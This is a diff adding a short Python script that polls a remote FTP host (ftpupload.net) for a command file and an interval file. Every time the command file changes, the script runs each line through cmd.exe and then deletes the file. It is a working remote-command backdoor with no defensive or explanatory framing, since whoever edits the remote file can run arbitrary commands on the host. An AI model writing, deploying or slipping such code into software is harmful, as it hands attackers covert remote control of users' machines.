@@ -1,0 +1,39 @@
+import requests
+import hashlib
+import time
+import subprocess
+import os
+
+old_hash = None
+ftp = "ftp://ftpupload.net/"
+local_file = "online.txt"
+timer_file = "timer.txt"
+user = "user"
+passwd = "password"
+
+while True:
+    response = requests.get(f"{ftp}{timer_file}", auth=(user, passwd))
+    with open(timer_file, 'wb') as t:
+        t.write(response.content)
+
+    response = requests.get(f"{ftp}{local_file}", auth=(user, passwd))
+    with open(local_file, 'wb') as f:
+        f.write(response.content)
+
+    current_hash = hashlib.sha256(open(local_file, 'rb').read()).hexdigest()
+
+    if current_hash != old_hash:
+        old_hash = current_hash
+        if os.path.exists(local_file):
+            with open(local_file, 'r') as file:
+                for line in file:
+                    subprocess.call(["cmd.exe", "/c", line.strip()])
+            os.remove(local_file)
+
+    try:
+        with open(timer_file, 'r') as t:
+            sleep_duration = int(t.read())
+            print(f"Sleeping for {sleep_duration} seconds.")
+            time.sleep(sleep_duration)
+    except ValueError:
+        print(f"Invalid integer in {timer_file}.")
